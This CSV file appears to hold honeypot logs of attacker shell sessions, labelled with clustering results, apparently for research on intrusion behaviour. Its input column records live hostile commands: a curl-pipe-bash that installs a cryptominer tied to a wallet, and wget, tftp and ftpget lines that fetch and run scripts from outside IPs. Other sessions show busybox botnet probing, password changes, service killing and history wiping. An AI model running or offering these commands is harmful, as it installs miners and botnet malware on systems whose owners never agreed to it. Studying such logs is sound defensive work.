session,PCKmeans_exp_result,Unnamed: 0,duration,command_freq,input
42d6c146da5b,0,1266,0.5584530830383301,2,cd /tmp; curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA; wget http://179.43.175.170/putkite/quickr1n.sh; curl -O http://179.43.175.170/putkite/quickr1n.sh; chmod 777 *; sh quickr1n.sh; echo storytime
42d6c146da5b,0,1267,0.5584530830383301,2,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA
23dfbb76838e,2,1268,2.7164313793182373,13,enable
23dfbb76838e,2,1269,2.7164313793182373,13,system
23dfbb76838e,2,1270,2.7164313793182373,13,system
23dfbb76838e,2,1271,2.7164313793182373,13,shell
23dfbb76838e,2,1272,2.7164313793182373,13,shell
23dfbb76838e,2,1273,2.7164313793182373,13,sh
23dfbb76838e,2,1274,2.7164313793182373,13,cat /proc/mounts; /bin/busybox HBGMS
23dfbb76838e,2,1275,2.7164313793182373,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox HBGMS
23dfbb76838e,2,1276,2.7164313793182373,13,tftp; wget; /bin/busybox HBGMS
23dfbb76838e,2,1277,2.7164313793182373,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
23dfbb76838e,2,1278,2.7164313793182373,13,while read i
23dfbb76838e,2,1279,2.7164313793182373,13,/bin/busybox HBGMS
23dfbb76838e,2,1280,2.7164313793182373,13,rm .s; exit
9930acbff2fb,1,1281,0.215735435485839,1,echo ok
441515dfa55d,1,1282,0.159708023071289,1,echo ok
ce3f829efe9e,1,1283,0.775839328765869,1,nproc;uname -a
6e89efd99726,0,1284,0.5409586429595941,2,cd /tmp; curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA; wget http://179.43.175.170/putkite/quickr1n.sh; curl -O http://179.43.175.170/putkite/quickr1n.sh; chmod 777 *; sh quickr1n.sh; echo storytime
6e89efd99726,0,1285,0.5409586429595941,2,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA
bff7f104d8cb,0,1286,0.485870361328125,2,cd /tmp; curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA; wget http://179.43.175.170/putkite/quickr1n.sh; curl -O http://179.43.175.170/putkite/quickr1n.sh; chmod 777 *; sh quickr1n.sh; echo storytime
bff7f104d8cb,0,1287,0.485870361328125,2,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA
5c5b42d76eb2,1,1288,0.226839542388916,1,echo ok
913dac1261a1,1,1289,0.385785102844238,2,sudo hive-passwd ifjeeisurofmioufiose; pkill Xorg; pkill x11vnc; pkill Hello; systemctl stop shellinabox; history -c; cat /hive-config/rig.conf; uname -a
913dac1261a1,1,1290,0.385785102844238,2,systemctl stop shellinabox
934692a20680,1,1291,0.167858839035034,1,echo ok
12f157653cfd,1,1292,0.384040832519531,2,sudo hive-passwd ifjeeisurofmioufiose; pkill Xorg; pkill x11vnc; pkill Hello; systemctl stop shellinabox; history -c; cat /hive-config/rig.conf; uname -a
12f157653cfd,1,1293,0.384040832519531,2,systemctl stop shellinabox
d9330d785990,1,1294,0.65178894996643,1,nproc;uname -a
e3242c9f941f,1,1295,0.31667160987854,1,nproc;uname -a
b02c9d0184da,1,1296,0.5880553722381591,1,nproc;uname -a
41b75ededf0a,1,1297,24.44353127479553,1,uname -a
a2cb553daf2f,2,1298,0.5143306255340571,13,enable
a2cb553daf2f,2,1299,0.5143306255340571,13,system
a2cb553daf2f,2,1300,0.5143306255340571,13,system
a2cb553daf2f,2,1301,0.5143306255340571,13,shell
a2cb553daf2f,2,1302,0.5143306255340571,13,shell
a2cb553daf2f,2,1303,0.5143306255340571,13,sh
a2cb553daf2f,2,1304,0.5143306255340571,13,cat /proc/mounts; /bin/busybox IUHSU
a2cb553daf2f,2,1305,0.5143306255340571,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox IUHSU
a2cb553daf2f,2,1306,0.5143306255340571,13,tftp; wget; /bin/busybox IUHSU
a2cb553daf2f,2,1307,0.5143306255340571,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
a2cb553daf2f,2,1308,0.5143306255340571,13,while read i
a2cb553daf2f,2,1309,0.5143306255340571,13,/bin/busybox IUHSU
a2cb553daf2f,2,1310,0.5143306255340571,13,rm .s; exit
1cc39b42408d,2,1311,1.475886583328247,13,enable
1cc39b42408d,2,1312,1.475886583328247,13,system
1cc39b42408d,2,1313,1.475886583328247,13,system
1cc39b42408d,2,1314,1.475886583328247,13,shell
1cc39b42408d,2,1315,1.475886583328247,13,shell
1cc39b42408d,2,1316,1.475886583328247,13,sh
1cc39b42408d,2,1317,1.475886583328247,13,cat /proc/mounts; /bin/busybox DJWXO
1cc39b42408d,2,1318,1.475886583328247,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox DJWXO
1cc39b42408d,2,1319,1.475886583328247,13,tftp; wget; /bin/busybox DJWXO
1cc39b42408d,2,1320,1.475886583328247,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
1cc39b42408d,2,1321,1.475886583328247,13,while read i
1cc39b42408d,2,1322,1.475886583328247,13,/bin/busybox DJWXO
1cc39b42408d,2,1323,1.475886583328247,13,rm .s; exit
f741cd1e8a21,2,1324,1.148563146591186,13,enable
f741cd1e8a21,2,1325,1.148563146591186,13,system
f741cd1e8a21,2,1326,1.148563146591186,13,system
f741cd1e8a21,2,1327,1.148563146591186,13,shell
f741cd1e8a21,2,1328,1.148563146591186,13,shell
f741cd1e8a21,2,1329,1.148563146591186,13,sh
f741cd1e8a21,2,1330,1.148563146591186,13,cat /proc/mounts; /bin/busybox JHDQU
f741cd1e8a21,2,1331,1.148563146591186,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox JHDQU
f741cd1e8a21,2,1332,1.148563146591186,13,tftp; wget; /bin/busybox JHDQU
f741cd1e8a21,2,1333,1.148563146591186,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
f741cd1e8a21,2,1334,1.148563146591186,13,while read i
f741cd1e8a21,2,1335,1.148563146591186,13,/bin/busybox JHDQU
f741cd1e8a21,2,1336,1.148563146591186,13,rm .s; exit
b42bfa1960a4,2,1337,1.201942205429077,13,enable
b42bfa1960a4,2,1338,1.201942205429077,13,system
b42bfa1960a4,2,1339,1.201942205429077,13,system
b42bfa1960a4,2,1340,1.201942205429077,13,shell
b42bfa1960a4,2,1341,1.201942205429077,13,shell
b42bfa1960a4,2,1342,1.201942205429077,13,sh
b42bfa1960a4,2,1343,1.201942205429077,13,cat /proc/mounts; /bin/busybox UULXN
b42bfa1960a4,2,1344,1.201942205429077,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox UULXN
b42bfa1960a4,2,1345,1.201942205429077,13,tftp; wget; /bin/busybox UULXN
b42bfa1960a4,2,1346,1.201942205429077,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
b42bfa1960a4,2,1347,1.201942205429077,13,while read i
b42bfa1960a4,2,1348,1.201942205429077,13,/bin/busybox UULXN
b42bfa1960a4,2,1349,1.201942205429077,13,rm .s; exit
6c4e0ab2be38,1,1350,0.404514074325561,1,nproc;uname -a
2d5ce0d6349a,2,1351,16.66348695755005,13,enable
2d5ce0d6349a,2,1352,16.66348695755005,13,system
2d5ce0d6349a,2,1353,16.66348695755005,13,system
2d5ce0d6349a,2,1354,16.66348695755005,13,shell
2d5ce0d6349a,2,1355,16.66348695755005,13,shell
2d5ce0d6349a,2,1356,16.66348695755005,13,sh
2d5ce0d6349a,2,1357,16.66348695755005,13,cat /proc/mounts; /bin/busybox PSYEU
2d5ce0d6349a,2,1358,16.66348695755005,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox PSYEU
2d5ce0d6349a,2,1359,16.66348695755005,13,tftp; wget; /bin/busybox PSYEU
2d5ce0d6349a,2,1360,16.66348695755005,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
2d5ce0d6349a,2,1361,16.66348695755005,13,while read i
2d5ce0d6349a,2,1362,16.66348695755005,13,/bin/busybox PSYEU
2d5ce0d6349a,2,1363,16.66348695755005,13,rm .s; exit
0fc2a32e807a,1,1364,20.00231456756592,6,enable
0fc2a32e807a,1,1365,20.00231456756592,6,system
0fc2a32e807a,1,1366,20.00231456756592,6,system
0fc2a32e807a,1,1367,20.00231456756592,6,shell
0fc2a32e807a,1,1368,20.00231456756592,6,shell
0fc2a32e807a,1,1369,20.00231456756592,6,sh
b595fe6bf441,1,1370,0.154893159866333,1,echo ok
e612739ba32c,1,1371,0.193461656570434,1,echo ok
cbfc61bd3888,1,1372,0.227474451065063,1,echo ok
2b4be03ad6e9,1,1373,0.156004667282104,1,echo ok
8290facb6af6,1,1374,0.154211997985839,1,echo ok
b971629dd3ad,1,1375,1.374525785446167,1,uname -s -m
4a218c73e700,1,1376,1.434186458587646,1,uname -s -m
688fb66dc85d,2,1377,3.779717206954956,13,enable
688fb66dc85d,2,1378,3.779717206954956,13,system
688fb66dc85d,2,1379,3.779717206954956,13,system
688fb66dc85d,2,1380,3.779717206954956,13,shell
688fb66dc85d,2,1381,3.779717206954956,13,shell
688fb66dc85d,2,1382,3.779717206954956,13,sh
688fb66dc85d,2,1383,3.779717206954956,13,cat /proc/mounts; /bin/busybox MHNAT
688fb66dc85d,2,1384,3.779717206954956,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox MHNAT
688fb66dc85d,2,1385,3.779717206954956,13,tftp; wget; /bin/busybox MHNAT
688fb66dc85d,2,1386,3.779717206954956,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
688fb66dc85d,2,1387,3.779717206954956,13,while read i
688fb66dc85d,2,1388,3.779717206954956,13,/bin/busybox MHNAT
688fb66dc85d,2,1389,3.779717206954956,13,rm .s; exit
7b4084eccdc7,1,1390,0.199703693389892,1,echo ok
7becfed10a8d,2,1391,4.87666130065918,13,enable
7becfed10a8d,2,1392,4.87666130065918,13,system
7becfed10a8d,2,1393,4.87666130065918,13,system
7becfed10a8d,2,1394,4.87666130065918,13,shell
7becfed10a8d,2,1395,4.87666130065918,13,shell
7becfed10a8d,2,1396,4.87666130065918,13,sh
7becfed10a8d,2,1397,4.87666130065918,13,cat /proc/mounts; /bin/busybox PCOZS
7becfed10a8d,2,1398,4.87666130065918,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox PCOZS
7becfed10a8d,2,1399,4.87666130065918,13,tftp; wget; /bin/busybox PCOZS
7becfed10a8d,2,1400,4.87666130065918,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
7becfed10a8d,2,1401,4.87666130065918,13,while read i
7becfed10a8d,2,1402,4.87666130065918,13,/bin/busybox PCOZS
7becfed10a8d,2,1403,4.87666130065918,13,rm .s; exit
b07077ed51ca,2,1404,2.435240507125854,13,enable
b07077ed51ca,2,1405,2.435240507125854,13,system
b07077ed51ca,2,1406,2.435240507125854,13,system
b07077ed51ca,2,1407,2.435240507125854,13,shell
b07077ed51ca,2,1408,2.435240507125854,13,shell
b07077ed51ca,2,1409,2.435240507125854,13,sh
b07077ed51ca,2,1410,2.435240507125854,13,cat /proc/mounts; /bin/busybox UQDHS
b07077ed51ca,2,1411,2.435240507125854,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox UQDHS
b07077ed51ca,2,1412,2.435240507125854,13,tftp; wget; /bin/busybox UQDHS
b07077ed51ca,2,1413,2.435240507125854,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
b07077ed51ca,2,1414,2.435240507125854,13,while read i
b07077ed51ca,2,1415,2.435240507125854,13,/bin/busybox UQDHS
b07077ed51ca,2,1416,2.435240507125854,13,rm .s; exit
469c903b1431,2,1417,4.550234794616699,13,enable
469c903b1431,2,1418,4.550234794616699,13,system
469c903b1431,2,1419,4.550234794616699,13,system
469c903b1431,2,1420,4.550234794616699,13,shell
469c903b1431,2,1421,4.550234794616699,13,shell
469c903b1431,2,1422,4.550234794616699,13,sh
469c903b1431,2,1423,4.550234794616699,13,cat /proc/mounts; /bin/busybox QDDCL
469c903b1431,2,1424,4.550234794616699,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox QDDCL
469c903b1431,2,1425,4.550234794616699,13,tftp; wget; /bin/busybox QDDCL
469c903b1431,2,1426,4.550234794616699,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
469c903b1431,2,1427,4.550234794616699,13,while read i
469c903b1431,2,1428,4.550234794616699,13,/bin/busybox QDDCL
469c903b1431,2,1429,4.550234794616699,13,rm .s; exit
b54aedc8aec6,1,1430,14.46304988861084,2,enable
b54aedc8aec6,1,1431,14.46304988861084,2,busybox
b8850d161cc0,1,1432,14.106797456741331,2,enable
b8850d161cc0,1,1433,14.106797456741331,2,busybox
f191c07cd666,1,1434,14.088508129119871,2,enable
f191c07cd666,1,1435,14.088508129119871,2,busybox
fc23d1986be7,1,1436,19.436023235321045,2,enable
fc23d1986be7,1,1437,19.436023235321045,2,busybox
5ba737aad16d,1,1438,1.829054355621338,1,uname -s -m
7c4a91ca15b9,1,1439,7.035588502883911,2,enable
7c4a91ca15b9,1,1440,7.035588502883911,2,busybox
b5283ba3eec0,2,1441,0.92331051826477,13,enable
b5283ba3eec0,2,1442,0.92331051826477,13,system
b5283ba3eec0,2,1443,0.92331051826477,13,system
b5283ba3eec0,2,1444,0.92331051826477,13,shell
b5283ba3eec0,2,1445,0.92331051826477,13,shell
b5283ba3eec0,2,1446,0.92331051826477,13,sh
b5283ba3eec0,2,1447,0.92331051826477,13,cat /proc/mounts; /bin/busybox UXNFI
b5283ba3eec0,2,1448,0.92331051826477,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox UXNFI
b5283ba3eec0,2,1449,0.92331051826477,13,tftp; wget; /bin/busybox UXNFI
b5283ba3eec0,2,1450,0.92331051826477,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
b5283ba3eec0,2,1451,0.92331051826477,13,while read i
b5283ba3eec0,2,1452,0.92331051826477,13,/bin/busybox UXNFI
b5283ba3eec0,2,1453,0.92331051826477,13,rm .s; exit
3f3bb254cfaa,2,1454,13.52911376953125,13,enable
3f3bb254cfaa,2,1455,13.52911376953125,13,system
3f3bb254cfaa,2,1456,13.52911376953125,13,system
3f3bb254cfaa,2,1457,13.52911376953125,13,shell
3f3bb254cfaa,2,1458,13.52911376953125,13,shell
3f3bb254cfaa,2,1459,13.52911376953125,13,sh
3f3bb254cfaa,2,1460,13.52911376953125,13,cat /proc/mounts; /bin/busybox HRIJE
3f3bb254cfaa,2,1461,13.52911376953125,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox HRIJE
3f3bb254cfaa,2,1462,13.52911376953125,13,tftp; wget; /bin/busybox HRIJE
3f3bb254cfaa,2,1463,13.52911376953125,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
3f3bb254cfaa,2,1464,13.52911376953125,13,while read i
3f3bb254cfaa,2,1465,13.52911376953125,13,/bin/busybox HRIJE
3f3bb254cfaa,2,1466,13.52911376953125,13,rm .s; exit
eaf6d0812143,4,1467,14.615695714950562,12,enable
eaf6d0812143,4,1468,14.615695714950562,12,system
eaf6d0812143,4,1469,14.615695714950562,12,system
eaf6d0812143,4,1470,14.615695714950562,12,shell
eaf6d0812143,4,1471,14.615695714950562,12,shell
eaf6d0812143,4,1472,14.615695714950562,12,sh
eaf6d0812143,4,1473,14.615695714950562,12,cat /proc/mounts; /bin/busybox FSDLN
eaf6d0812143,4,1474,14.615695714950562,12,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox FSDLN
eaf6d0812143,4,1475,14.615695714950562,12,tftp; wget; /bin/busybox FSDLN
eaf6d0812143,4,1476,14.615695714950562,12,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
eaf6d0812143,4,1477,14.615695714950562,12,while read i
eaf6d0812143,4,1478,14.615695714950562,12,/bin/busybox FSDLN
7b4c41825474,2,1479,16.156800746917725,13,enable
7b4c41825474,2,1480,16.156800746917725,13,system
7b4c41825474,2,1481,16.156800746917725,13,system
7b4c41825474,2,1482,16.156800746917725,13,shell
7b4c41825474,2,1483,16.156800746917725,13,shell
7b4c41825474,2,1484,16.156800746917725,13,sh
7b4c41825474,2,1485,16.156800746917725,13,cat /proc/mounts; /bin/busybox TLDTB
7b4c41825474,2,1486,16.156800746917725,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox TLDTB
7b4c41825474,2,1487,16.156800746917725,13,tftp; wget; /bin/busybox TLDTB
7b4c41825474,2,1488,16.156800746917725,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
7b4c41825474,2,1489,16.156800746917725,13,while read i
7b4c41825474,2,1490,16.156800746917725,13,/bin/busybox TLDTB
7b4c41825474,2,1491,16.156800746917725,13,rm .s; exit
ad2bf5411c6d,2,1492,7.753438234329224,13,enable
ad2bf5411c6d,2,1493,7.753438234329224,13,system
ad2bf5411c6d,2,1494,7.753438234329224,13,system
ad2bf5411c6d,2,1495,7.753438234329224,13,shell
ad2bf5411c6d,2,1496,7.753438234329224,13,shell
ad2bf5411c6d,2,1497,7.753438234329224,13,sh
ad2bf5411c6d,2,1498,7.753438234329224,13,cat /proc/mounts; /bin/busybox SXTTV
ad2bf5411c6d,2,1499,7.753438234329224,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox SXTTV
ad2bf5411c6d,2,1500,7.753438234329224,13,tftp; wget; /bin/busybox SXTTV
ad2bf5411c6d,2,1501,7.753438234329224,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
ad2bf5411c6d,2,1502,7.753438234329224,13,while read i
ad2bf5411c6d,2,1503,7.753438234329224,13,/bin/busybox SXTTV
ad2bf5411c6d,2,1504,7.753438234329224,13,rm .s; exit
0ba9a5c194b2,2,1505,15.915402173995972,13,enable
0ba9a5c194b2,2,1506,15.915402173995972,13,system
0ba9a5c194b2,2,1507,15.915402173995972,13,system
0ba9a5c194b2,2,1508,15.915402173995972,13,shell
0ba9a5c194b2,2,1509,15.915402173995972,13,shell
0ba9a5c194b2,2,1510,15.915402173995972,13,sh
0ba9a5c194b2,2,1511,15.915402173995972,13,cat /proc/mounts; /bin/busybox LYKJM
0ba9a5c194b2,2,1512,15.915402173995972,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox LYKJM
0ba9a5c194b2,2,1513,15.915402173995972,13,tftp; wget; /bin/busybox LYKJM
0ba9a5c194b2,2,1514,15.915402173995972,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
0ba9a5c194b2,2,1515,15.915402173995972,13,while read i
0ba9a5c194b2,2,1516,15.915402173995972,13,/bin/busybox LYKJM
0ba9a5c194b2,2,1517,15.915402173995972,13,rm .s; wget http://158.140.65.153:37871/.i; chmod 777 .i; ./.i; exit
32339bd99173,1,1518,0.223842859268188,1,nproc;uname -a
29cdad8e0238,1,1519,0.375962972640991,1,nproc;uname -a
4365e43a0eae,0,1520,31.56072568893433,1,cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.30.233.172/GhOul.sh; chmod 777 GhOul.sh; sh GhOul.sh; tftp 185.30.233.172 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 185.30.233.172; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 185.30.233.172 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf GhOul.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
50cab4d35fea,0,1521,30.760545015335083,1,cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://194.31.98.109/ohsitsvegawellrip.sh; curl -O http://194.31.98.109/ohsitsvegawellrip.sh; chmod 777 ohsitsvegawellrip.sh; sh ohsitsvegawellrip.sh; tftp 194.31.98.109 -c get ohsitsvegawellrip.sh; chmod 777 ohsitsvegawellrip.sh; sh ohsitsvegawellrip.sh; tftp -r ohsitsvegawellrip2.sh -g 194.31.98.109; chmod 777 ohsitsvegawellrip2.sh; sh ohsitsvegawellrip2.sh; ftpget -v -u anonymous -p anonymous -P 21 194.31.98.109 ohsitsvegawellrip1.sh ohsitsvegawellrip1.sh; sh ohsitsvegawellrip1.sh; rm -rf ohsitsvegawellrip.sh ohsitsvegawellrip.sh ohsitsvegawellrip2.sh ohsitsvegawellrip1.sh; rm -rf *
1fdecee97afb,0,1522,15.339839458465576,1,cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://194.31.98.109/Sakura.sh; chmod 777 *; sh Sakura.sh; tftp -g 194.31.98.109 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c
7e717ba7033e,0,1523,15.42853593826294,1,cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://194.31.98.109/Sakura.sh; chmod 777 *; sh Sakura.sh; tftp -g 194.31.98.109 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c
41ffcf5aaed6,0,1524,15.331400632858276,1,cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://194.31.98.109/Sakura.sh; chmod 777 *; sh Sakura.sh; tftp -g 194.31.98.109 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c
067e89c2f99f,2,1525,0.89614462852478,13,enable
067e89c2f99f,2,1526,0.89614462852478,13,system
067e89c2f99f,2,1527,0.89614462852478,13,system
067e89c2f99f,2,1528,0.89614462852478,13,shell
067e89c2f99f,2,1529,0.89614462852478,13,shell
067e89c2f99f,2,1530,0.89614462852478,13,sh
067e89c2f99f,2,1531,0.89614462852478,13,cat /proc/mounts; /bin/busybox ZCTOM
067e89c2f99f,2,1532,0.89614462852478,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox ZCTOM
067e89c2f99f,2,1533,0.89614462852478,13,tftp; wget; /bin/busybox ZCTOM
067e89c2f99f,2,1534,0.89614462852478,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
067e89c2f99f,2,1535,0.89614462852478,13,while read i
067e89c2f99f,2,1536,0.89614462852478,13,/bin/busybox ZCTOM
067e89c2f99f,2,1537,0.89614462852478,13,rm .s; exit
174a49d995b2,0,1538,17.5905442237854,6,wget -qO - http://202.110.187.205/x/1sh | sh > /dev/null 2>&1 &
174a49d995b2,0,1539,17.5905442237854,6,rm -rf /var/run/1sh; wget -c http://202.110.187.205/x/1sh -P /var/run && sh /var/run/1sh &
174a49d995b2,0,1540,17.5905442237854,6,wget -qO - http://202.110.187.205/x/2sh | sh > /dev/null 2>&1 &
174a49d995b2,0,1541,17.5905442237854,6,rm -rf /tmp/2sh; wget -c http://202.110.187.205/x/2sh -P /tmp && sh /tmp/2sh &
174a49d995b2,0,1542,17.5905442237854,6,curl http://202.110.187.205/x/3sh | sh
174a49d995b2,0,1543,17.5905442237854,6,cd /var/run ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &
1ef7a0354c37,2,1544,0.377510786056518,13,enable
1ef7a0354c37,2,1545,0.377510786056518,13,system
1ef7a0354c37,2,1546,0.377510786056518,13,system
1ef7a0354c37,2,1547,0.377510786056518,13,shell
1ef7a0354c37,2,1548,0.377510786056518,13,shell
1ef7a0354c37,2,1549,0.377510786056518,13,sh
1ef7a0354c37,2,1550,0.377510786056518,13,cat /proc/mounts; /bin/busybox QYJFQ
1ef7a0354c37,2,1551,0.377510786056518,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox QYJFQ
1ef7a0354c37,2,1552,0.377510786056518,13,tftp; wget; /bin/busybox QYJFQ
1ef7a0354c37,2,1553,0.377510786056518,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
1ef7a0354c37,2,1554,0.377510786056518,13,while read i
1ef7a0354c37,2,1555,0.377510786056518,13,/bin/busybox QYJFQ
1ef7a0354c37,2,1556,0.377510786056518,13,rm .s; exit
77161cb85aa4,2,1557,2.728189706802368,13,enable
77161cb85aa4,2,1558,2.728189706802368,13,system
77161cb85aa4,2,1559,2.728189706802368,13,system
77161cb85aa4,2,1560,2.728189706802368,13,shell
77161cb85aa4,2,1561,2.728189706802368,13,shell
77161cb85aa4,2,1562,2.728189706802368,13,sh
77161cb85aa4,2,1563,2.728189706802368,13,cat /proc/mounts; /bin/busybox DUSTP
77161cb85aa4,2,1564,2.728189706802368,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox DUSTP
77161cb85aa4,2,1565,2.728189706802368,13,tftp; wget; /bin/busybox DUSTP
77161cb85aa4,2,1566,2.728189706802368,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
77161cb85aa4,2,1567,2.728189706802368,13,while read i
77161cb85aa4,2,1568,2.728189706802368,13,/bin/busybox DUSTP
77161cb85aa4,2,1569,2.728189706802368,13,rm .s; exit
6e88efc81d97,2,1570,0.65105652809143,13,enable
6e88efc81d97,2,1571,0.65105652809143,13,system
6e88efc81d97,2,1572,0.65105652809143,13,system
